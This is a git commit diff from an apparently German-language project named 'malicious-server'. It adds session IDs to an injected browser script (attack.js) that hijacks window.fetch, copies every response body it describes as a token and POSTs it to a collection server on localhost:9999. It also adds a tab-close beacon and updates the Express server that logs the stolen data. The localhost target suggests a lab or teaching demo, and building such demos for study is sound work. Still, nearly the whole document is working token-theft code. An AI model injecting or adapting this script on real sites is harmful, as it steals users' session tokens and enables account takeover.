843a5e9f2e73066b1e4e571ddb60a806bc832110
nick1699 <accounts@nickboard.de>
2024-04-01 15:37:22 +0200

    add sessionId to requests

--- malicious-server/public/attack.js
+++ malicious-server/public/attack.js
@@ -1,4 +1,5 @@
 (function() {
+    const sessionId = Date.now() + Math.random().toString(36).substring(2, 9);
     const originalFetch = window.fetch;
 
     // Alle HTTP-Request abfangen
@@ -10,31 +11,34 @@
                 const clonedResponse = response.clone();
 
                 clonedResponse.json().then(body => {
-                    fetch('http://localhost:9999/rest/receive-token-body', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(body),
-                    }).then(() => {
-                        console.log('Token-Body erfolgreich an den Server gesendet.');
-                    }).catch(error => {
-                        console.error('Fehler beim Senden des Token-Body an den Server:', error);
-                    });
+                    sendTokenBodyToServer(body);
                 }).catch(error => {
                     console.error('Fehler beim Lesen des Response-Body:', error);
                 });
 
+                // Response wird returned, um von normaler Website weiterverarbeitet werden zu können
                 return response;
             });
         } else {
             return originalFetch.apply(this, args);
         }
     };
+
+    const sendTokenBodyToServer = (body) => {
+        fetch('http://localhost:9999/rest/receive-token-body', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ sessionId: sessionId, body: body }),
+        });
+    };
+
+    function informServerAboutTabClose() {
+        navigator.sendBeacon('http://localhost:9999/rest/tab-closed', sessionId);
+    }
+
+    window.addEventListener('beforeunload', informServerAboutTabClose);
 })();
 
-function informServerAboutTabClose() {
-    navigator.sendBeacon('http://localhost:9999/rest/tab-closed', JSON.stringify({ message: 'Tab geschlossen' }));
-}
 
-window.addEventListener('beforeunload', informServerAboutTabClose);
--- malicious-server/src/server.js
+++ malicious-server/src/server.js
@@ -4,15 +4,19 @@ const app = express();
 const port = 9999;
 
 app.use(bodyParser.json());
+app.use(bodyParser.text());
 app.use(express.static('public'));
 
 app.post('/rest/receive-token-body', (req, res) => {
-    console.log("Empfangener Token-Body:", req.body);
+    const { sessionId, body } = req.body;
+    console.log(`Empfangener Token-Body von Sitzung ${sessionId}:`, body);
     res.status(200).send();
 });
 
 app.post('/rest/tab-closed', (req, res) => {
-    console.log("Tab oder Browser wurde geschlossen");
+    const sessionId = req.body;
+    console.log(`Tab oder Browser mit Sitzung ${sessionId} wurde geschlossen`);
+    res.status(200).send('Tab-Schließung registriert');
 });
 
 app.listen(port, () => {
